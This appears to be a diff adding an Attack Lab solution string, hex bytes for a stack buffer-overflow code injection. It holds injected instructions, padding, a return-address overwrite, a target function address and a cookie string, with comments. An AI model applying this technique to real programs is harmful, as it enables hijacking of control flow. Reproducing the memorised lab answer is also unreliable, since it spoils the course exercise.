@@ -1,0 +1,8 @@
+48 c7 c7 20 ee 63 55 c3 /* My cookie = RSP + 0x38 = 0x5563EE20 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 32 Bytes padding */
+e8 ed 63 55 00 00 00 00 /* address of register %rsp */
+bd 15 40 00 00 00 00 00 /* Touch3 address */
+35 66 30 37 62 30 66 66 /* cookie string */
